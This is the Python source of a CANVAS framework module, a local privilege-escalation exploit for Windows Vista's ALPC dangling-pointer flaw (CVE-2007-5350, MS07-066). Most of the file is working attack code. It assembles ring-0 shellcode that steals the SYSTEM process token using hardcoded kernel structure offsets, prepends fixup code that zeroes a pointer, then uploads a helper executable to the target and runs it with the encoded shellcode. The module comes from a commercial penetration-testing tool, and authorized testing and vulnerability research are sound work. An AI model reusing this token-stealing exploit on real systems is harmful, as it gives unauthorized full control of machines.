#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2007
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import socket
import time
import struct
import base64

from exploitutils import *
from canvasexploit import canvasexploit
from ExploitTypes.localexploit import LocalExploit
from shelllistener import *
from MOSDEF import mosdef
import canvasengine

NAME='Microsoft Vista ALPC Dangling Pointer Overwrite'
DESCRIPTION='Microsoft Vista ALPC Dangling Pointer Overwrite'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION['Date public']='12/11/07'
DOCUMENTATION['CVE Name'] = 'CVE-2007-5350'
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-5350'
DOCUMENTATION['CVSS'] = 7.2
DOCUMENTATION['References']='www.microsoft.com/technet/security/bulletin/ms07-066.mspx'

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Local'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['Vista']
PROPERTY['MSADV']='MS07-066'
PROPERTY['MS PATCHES']=["KB943078"]

NOTES="""
TODO ADD TESTING AND USAGE NOTES
"""

TODO="""
"""

class theexploit(LocalExploit):
    def __init__(self):
        LocalExploit.__init__(self)
        self.name=NAME
        self.upload_filename='Resources/ms07_066.exe'
        self.remote_filename=''

    def CreateRing0Shellcode(self,pid=-1,retadd=0):
        """Replace the Token of a Process by the one of the System process
           If _pid_ is -1, then the 'current' process Token will be replaced,
           otherwise, the one of the process with the given _pid_ will be.
           _retadd_ adjusts the stack for the 'ret' instruction, it depends
           from where your shellcode is called"""

        ring0shellcode="""    xorl %eax,%eax
    movl %fs:0x124(%eax),%eax
    movl 0xProcessOffset(%eax),%eax
    movl %eax,%ecx
find_system_process:
    movl 0xActiveProcessLinksOffset(%eax),%eax
    subl $0xActiveProcessLinksOffset,%eax
    cmpl $0xSystemProcessId,0xUniqueProcessIdOffset(%eax)
    jnz find_system_process
    movl 0xTokenOffset(%eax),%edx //Token of System process
    movl %ecx,%eax
"""
        if pid!=-1:
            ring0shellcode+="""find_our_process:
    movl 0xActiveProcessLinksOffset(%eax),%eax
    subl $0xActiveProcessLinksOffset,%eax
    cmpl $0xOurProcessId,0xUniqueProcessIdOffset(%eax)
    jnz find_our_process
"""
        ring0shellcode+='    movl %edx,0xTokenOffset(%eax) //Replace the Token of our process\n'
        if retadd==0:
            ring0shellcode+='    ret\n'
        else:
            ring0shellcode+='    ret $0x%x\n'%(retadd)
        self.log('Creating RING0 Token stealing shellcode for ProcessId %d'%(pid))
        parameters={}
        parameters['ProcessOffset']=0x48 #nt!_KTHREAD.ApcState.Process
        parameters['ActiveProcessLinksOffset']=0xa0 #nt!_EPROCESS.ActiveProcessLinks
        parameters['UniqueProcessIdOffset']=0x9c #nt!_EPROCESS.UniqueProcessId
        parameters['TokenOffset']=0xe0 #nt!_EPROCESS.Token
        parameters['OurProcessId']=pid
        parameters['SystemProcessId']=0x04
        for k in parameters.keys():
            ring0shellcode=ring0shellcode.replace(k,'%x'%(parameters[k]))
        self.shellcode=mosdef.assemble(ring0shellcode,'x86')
        print ring0shellcode #DEBUG

        return self.shellcode

    def run_attack(self,node):
        self.node=node #XXX: not needed?
        ret,nodeos=node.shell.GetVersionEx()
        minor=nodeos['Minor Version']
        major=nodeos['Major Version']
        self.log('Attacking Windows %d.%d'%(major,minor))
        if major!=6:
            self.log('This exploit is only for Windows Vista.')
            return 0
        pid=node.shell.getpid() #the ProcessId we want to elevate to System
        self.CreateRing0Shellcode(pid,4)
        fixcode="""    movl 0x0(%esp),%eax
    subl $0x1a,%eax //0x1a should be enough
search_loop:
    incl %eax
    cmpw $0x048b,0x0(%eax) //search for 8b0405xxxxxxxx
    jnz search_loop
    movl 0x3(%eax),%ecx
.byte 0x0f
.byte 0xb6
.byte 0x46
.byte 0xe9  //movzbl -0x17(%esi),%eax
     movl 0x0(%ecx,%eax,4),%eax
     movl $0x0,0x14(%eax) //zero out the pointer
        """
        self.shellcode=mosdef.assemble(fixcode,'x86')+self.shellcode
        # Upload and execute the exploit with the shellcode as a commandline
        # argument. Not pretty but it should do the trick
        self.remote_filename=self.node.shell.getcwd()+'\\ms07_066.exe'
        ret=self.node.shell.upload(self.upload_filename,destfilename=self.remote_filename)
        if ret:
            ret=self.node.shell.dospawn('%s %s'%(self.remote_filename,base64.b64encode(self.shellcode)))
            self.log('dospawn returned: %s'%(ret))
        time.sleep(3)
        if self.ISucceeded():
            self.log('Exploit succeeded!')
            return 1
        self.log('Exploit seem to have failed.')
        return 0

    def run(self):
        self.setInfo('%s (in progress)'%(NAME))
        success=0 
        for node in self.argsDict['passednodes']:
            if 'win32api' not in node.capabilities:
                self.log('Node %s not a Win32 node'%(node.getname()))
                continue
            ret=self.run_attack(node)
            if ret==1:
                success=1
        return success

if __name__=='__main__':
    print 'This win32 local module is meant to be run only within CANVAS'
